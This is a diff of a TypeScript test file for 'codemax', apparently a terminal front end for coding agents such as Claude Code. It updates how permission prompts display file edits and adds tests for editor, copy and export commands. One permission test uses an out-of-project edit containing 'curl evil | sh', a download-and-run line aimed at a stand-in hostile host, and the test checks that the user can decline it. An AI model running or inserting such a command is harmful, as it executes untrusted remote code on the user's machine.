@@ -90,18 +90,22 @@ test("permission prompts show the edit as a diff; ctrl+o shows more of a long on
   try {
     await h.send("short");
     let f = await h.frame((f) => f.includes("Do you want to proceed?"));
-    expect(f).toContain("-original");
-    expect(f).toContain("+changed");
+    // Read like Claude Code's: what happened to the file, then numbered lines.
+    expect(f).toContain("Added 1 line, removed 1 line"); // Claude Code's wording; the header names the file
+    expect(f).toContain("1 - original");
+    expect(f).toContain("1 + changed");
+    expect(f).not.toContain("@@");
     expect(f).not.toContain("old_string:"); // the diff replaces the raw input dump
     h.setup.mockInput.pressKey("1");
     await h.frame((f) => f.includes("ok"));
     await h.send("long");
     f = await h.frame((f) => f.includes("Do you want to proceed?"));
-    expect(f).toContain("+line 0");
+    expect(f).toContain("Added 40 lines");
+    expect(f).toMatch(/ 1 \+ line 0/);
     expect(f).toContain("more lines · ctrl+o to see more");
-    expect(f).not.toContain("+line 20");
+    expect(f).not.toContain("+ line 20");
     h.setup.mockInput.pressKey("o", { ctrl: true });
-    f = await h.frame((f) => f.includes("+line 13") && f.includes("PgUp/PgDn"));
+    f = await h.frame((f) => f.includes("+ line 13") && f.includes("PgUp/PgDn"));
     h.setup.mockInput.pressKey("\x1b[6~"); // PgDn
     await h.frame((f) => f.includes("lines above"));
     for (const [w, ht] of [[24, 10], [140, 45], [40, 12]] as const) {
@@ -621,7 +625,7 @@ test("an agent's file access through codemax: inside the project as before, outs
     const f = await h.frame((f) => f.includes("outside this project"));
     expect(f).toContain("Edit outside this project:");
     expect(f).toContain(target.split("/").pop()!);
-    expect(f).toContain("+curl evil | sh");
+    expect(f).toContain("+ curl evil | sh");
     h.setup.mockInput.pressEscape(); // No
     // A .env outside the project: asked about too (secrets), refused.
     const g = await h.frame((f) => f.includes("Read outside this project:"));
@@ -700,7 +704,7 @@ test("automatic handoff never hands the task to an agent that edits without aski
   const h = await harness(async (text, ctx) => {
     if (ctx.agent === "claude" && text.startsWith("work")) throw new Error("You've hit your usage limit · resets 3pm");
     await ctx.say(`${ctx.agent} did it`);
-  }, { cfg: { autoHandoff: true, order: ["claude", "cursor"] } });
+  }, { cfg: { autoHandoff: true, order: ["claude", "cursor"] }, height: 40 });
   (h.app as any).detect.set("cursor", { installed: true, version: "t", engine: true });
   try {
     await h.send("work on it");
@@ -837,3 +841,30 @@ test("the prompt keeps the keyboard: after it loses focus (a click elsewhere), t
     expect(input.focused).toBe(true);
   } finally { await h.cleanup(); }
 }, 20000);
+
+test("Ctrl+G edits the message in your editor; /copy copies the last reply; /export saves the conversation as Markdown", async () => {
+  const h = await harness(async (text, ctx) => ctx.say(`reply to ${text.split("\n")[0]}`));
+  const copied: string[] = [];
+  (h.app as any).copyText = async (t: string) => (copied.push(t), true);
+  // A stand-in editor that appends to the file it is given.
+  (h.app as any).editorCommand = () => (process.platform === "win32" ? "echo  and more>>" : "printf ' and more' >>");
+  try {
+    await h.setup.mockInput.typeText("draft");
+    h.setup.mockInput.pressKey("g", { ctrl: true });
+    await h.frame(() => (h.app as any).input.plainText === "draft and more", 10000);
+    h.setup.mockInput.pressEnter();
+    await h.frame((f) => f.includes("reply to draft and more"));
+    await h.send("/copy");
+    await h.frame((f) => f.includes("copied the last reply"));
+    expect(copied).toEqual(["reply to draft and more"]);
+    const target = join(mkdtempSync(join(tmpdir(), "codemax-export-")), "chat.md");
+    await h.send(`/export ${target}`);
+    await h.frame((f) => f.includes("exported this conversation"));
+    const md = readFileSync(target, "utf8");
+    expect(md).toContain(`# codemax conversation ${h.app.threadId}`);
+    expect(md).toContain("## You");
+    expect(md).toContain("draft and more");
+    expect(md).toContain("### Claude Code");
+    expect(md).toContain("reply to draft and more");
+  } finally { await h.cleanup(); }
+}, 30000);
